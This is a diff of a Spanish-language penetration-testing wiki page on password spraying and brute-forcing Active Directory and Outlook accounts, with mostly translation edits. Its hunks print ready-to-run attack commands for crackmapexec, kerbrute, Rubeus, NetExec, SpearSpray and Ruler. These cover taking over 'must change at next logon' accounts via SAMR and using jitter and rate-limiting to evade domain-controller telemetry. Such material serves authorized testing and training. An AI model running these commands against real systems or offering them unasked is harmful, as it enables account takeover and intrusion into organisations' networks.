@@ -5,16 +5,16 @@
 
 ## **Password Spraying**
 
-Una vez que hayas encontrado varios **nombres de usuario válidos** puedes probar las **contraseñas más comunes** (ten en cuenta la **política de contraseñas** del entorno) con cada uno de los usuarios descubiertos.\
-Por **defecto** la **longitud** **mínima** **de** **contraseña** es **7**.
+Una vez que hayas encontrado varios **nombres de usuario válidos** puedes probar las **contraseñas más comunes** (ten en cuenta la política de contraseñas del entorno) con cada uno de los usuarios descubiertos.\
+Por **defecto** la **mínima** **longitud** **de** **contraseña** es **7**.
 
-Listas de nombres de usuario comunes también pueden ser útiles: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
+Lists of common usernames could also be useful: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
 
 Ten en cuenta que **podrías bloquear algunas cuentas si intentas varias contraseñas incorrectas** (por defecto más de 10).
 
 ### Obtener la política de contraseñas
 
-Si tienes credenciales de usuario o un shell como usuario de dominio puedes **obtener la política de contraseñas con**:
+Si tienes credenciales de usuario o un shell como usuario del dominio puedes **obtener la política de contraseñas con**:
 ```bash
 # From Linux
 crackmapexec <IP> -u 'user' -p 'password' --pass-pol
@@ -31,7 +31,7 @@ net accounts
 
 (Get-DomainPolicy)."SystemAccess" #From powerview
 ```
-### Explotación desde Linux (o todos)
+### Explotación desde Linux (o desde cualquier sistema)
 
 - Usando **crackmapexec:**
 ```bash
@@ -51,7 +51,7 @@ crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9c
 ```bash
 spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
 ```
-- Usando [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NO RECOMENDADO A VECES NO FUNCIONA
+- Usando [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - NO RECOMENDADO; A VECES NO FUNCIONA
 ```bash
 python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
 python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
@@ -69,7 +69,7 @@ done
 ```
 #### Desde Windows
 
-- Con la versión de [Rubeus](https://github.com/Zer1t0/Rubeus) con brute module:
+- Con [Rubeus](https://github.com/Zer1t0/Rubeus) versión con el módulo brute:
 ```bash
 # with a list of users
 .\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>
@@ -77,7 +77,7 @@ done
 # check passwords for all users in current domain
 .\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
 ```
-- Con [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Puede generar usuarios del dominio por defecto y obtendrá la política de contraseñas del dominio y limitará los intentos según ésta):
+- Con [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (puede generar usuarios del dominio de forma predeterminada, obtendrá la política de contraseñas del dominio y limitará los intentos de acuerdo con ella):
 ```bash
 Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
@@ -85,11 +85,11 @@ Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
 ```
 Invoke-SprayEmptyPassword
 ```
-### Identificar y tomar control de cuentas "Password must change at next logon" (SAMR)
+### Identificar y apoderarse de las cuentas "Password must change at next logon" (SAMR)
 
-Una técnica de bajo ruido consiste en spray a benign/empty password y capturar cuentas que devuelven STATUS_PASSWORD_MUST_CHANGE; esto indica que la contraseña fue forzosamente expirada y puede cambiarse sin conocer la anterior.
+Una técnica de bajo ruido es hacer password spraying con una contraseña benigna/vacía y detectar cuentas que devuelven STATUS_PASSWORD_MUST_CHANGE, lo que indica que la contraseña fue forzosamente expirada y puede cambiarse sin conocer la anterior.
 
-Workflow:
+Flujo de trabajo:
 - Enumerar usuarios (RID brute via SAMR) para construir la lista de objetivos:
 
 {{#ref}}
@@ -99,12 +99,12 @@ Workflow:
 # NetExec (null/guest) + RID brute to harvest users
 netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
 ```
-- Spray una password vacía y continúa con los aciertos para capturar cuentas que deben cambiarla en el próximo inicio de sesión:
+- Spray una contraseña vacía y sigue con los hits para capturar cuentas que deben cambiarla en el próximo logon:
 ```bash
 # Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
 netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
 ```
-- Para cada acierto, cambia la contraseña vía SAMR con el módulo de NetExec (no se necesita la contraseña antigua cuando "must change" está activado):
+- Para cada hit, cambia la password a través de SAMR con NetExec’s module (no se necesita old password cuando "must change" está establecido):
 ```bash
 # Strong complexity to satisfy policy
 env NEWPASS='P@ssw0rd!2025#' ; \
@@ -115,25 +115,25 @@ netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
 ```
 Notas operativas:
 - Asegúrate de que el reloj de tu host esté sincronizado con el DC antes de operaciones basadas en Kerberos: `sudo ntpdate <dc_fqdn>`.
-- Un [+] sin (Pwn3d!) en algunos módulos (p. ej., RDP/WinRM) significa que los creds son válidos pero la cuenta carece de derechos de inicio de sesión interactivo.
+- Un [+] sin (Pwn3d!) en algunos módulos (p. ej., RDP/WinRM) significa que las creds son válidas pero la cuenta carece de derechos de inicio de sesión interactivo.
 
 ## Brute Force
 ```bash
 legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
 ```
-### Kerberos pre-auth spraying con LDAP targeting y PSO-aware throttling (SpearSpray)
+### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)
 
-Kerberos pre-auth–based spraying reduce el ruido frente a los intentos de bind SMB/NTLM/LDAP y se alinea mejor con las políticas de lockout de AD. SpearSpray acopla LDAP-driven targeting, un motor de patrones y awareness de políticas (domain policy + PSOs + buffer de badPwdCount) para sprayear de forma precisa y segura. También puede etiquetar principals comprometidos en Neo4j para BloodHound pathing.
+Kerberos pre-auth–based spraying reduce el ruido frente a intentos SMB/NTLM/LDAP bind y se alinea mejor con las políticas de bloqueo de AD. SpearSpray combina targeting impulsado por LDAP, un motor de patrones y awareness de políticas (política de dominio + PSOs + buffer badPwdCount) para sprayar de forma precisa y segura. También puede etiquetar principals comprometidos en Neo4j para el pathing de BloodHound.
 
-Key ideas:
-- LDAP user discovery con paginación y soporte LDAPS, opcionalmente usando filtros LDAP personalizados.
-- Domain lockout policy + PSO-aware filtering para dejar un buffer configurable de intentos (threshold) y evitar bloquear usuarios.
-- Kerberos pre-auth validation utilizando bindings gssapi rápidos (genera 4768/4771 en DCs en lugar de 4625).
-- Generación de contraseñas por usuario basada en patrones, usando variables como nombres y valores temporales derivados del pwdLastSet de cada usuario.
-- Control de throughput con threads, jitter y max requests per second.
-- Integración opcional con Neo4j para marcar usuarios comprometidos para BloodHound.
+Ideas clave:
+- Descubrimiento de usuarios LDAP con paginación y soporte LDAPS, opcionalmente usando filtros LDAP personalizados.
+- Política de bloqueo de dominio + filtrado consciente de PSO para dejar un buffer configurable de intentos (umbral) y evitar bloquear usuarios.
+- Validación Kerberos pre-auth usando bindings gssapi rápidos (genera 4768/4771 en DCs en vez de 4625).
+- Generación de contraseñas por usuario basada en patrones usando variables como nombres y valores temporales derivados del pwdLastSet de cada usuario.
+- Control de throughput con threads, jitter y max requests por segundo.
+- Integración opcional con Neo4j para marcar usuarios propios para BloodHound.
 
-Basic usage and discovery:
+Uso básico y descubrimiento:
 ```bash
 # List available pattern variables
 spearspray -l
@@ -174,14 +174,14 @@ Descripción general del sistema de patrones (patterns.txt):
 {samaccountname}
 {extra}{separator}{year}{suffix}
 ```
-Variables disponibles:
+Variables disponibles incluyen:
 - {name}, {samaccountname}
-- Temporales de pwdLastSet (o whenCreated) de cada usuario: {year}, {short_year}, {month_number}, {month_en}, {season_en}
-- Auxiliares de composición y token de la org: {separator}, {suffix}, {extra}
+- Valores temporales de pwdLastSet (o whenCreated) de cada usuario: {year}, {short_year}, {month_number}, {month_en}, {season_en}
+- Ayudantes de composición y token de la organización: {separator}, {suffix}, {extra}
 
 Notas operativas:
-- Favorece consultar el PDC-emulator con -dc para leer el badPwdCount más autoritativo y la información relacionada con políticas.
-- Los resets de badPwdCount se disparan en el siguiente intento después de la ventana de observación; usa el umbral y la sincronización para mantenerte seguro.
+- Prefiere consultar el PDC-emulator con -dc para leer el badPwdCount más autoritativo y la info relacionada con la política.
+- Los reinicios de badPwdCount se activan en el siguiente intento después de la ventana de observación; usa umbrales y temporización para mantenerte seguro.
 - Los intentos de pre-auth de Kerberos aparecen como 4768/4771 en la telemetría del DC; usa jitter y rate-limiting para mimetizarte.
 
 > Consejo: SpearSpray’s default LDAP page size is 200; ajusta con -lps según sea necesario.
@@ -191,12 +191,12 @@ Notas operativas:
 Hay múltiples herramientas para p**assword spraying outlook**.
 
 - Con [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
-- con [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
+- Con [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
 - Con [Ruler](https://github.com/sensepost/ruler) (¡confiable!)
 - Con [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
 - Con [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)
 
-Para usar cualquiera de estas herramientas necesitas una lista de usuarios y una password / una pequeña lista de passwords para spray.
+Para usar cualquiera de estas herramientas, necesitas una lista de usuarios y una contraseña / una pequeña lista de contraseñas para password spraying.
 ```bash
 ./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
 [x] Failed: larsson:Summer2020
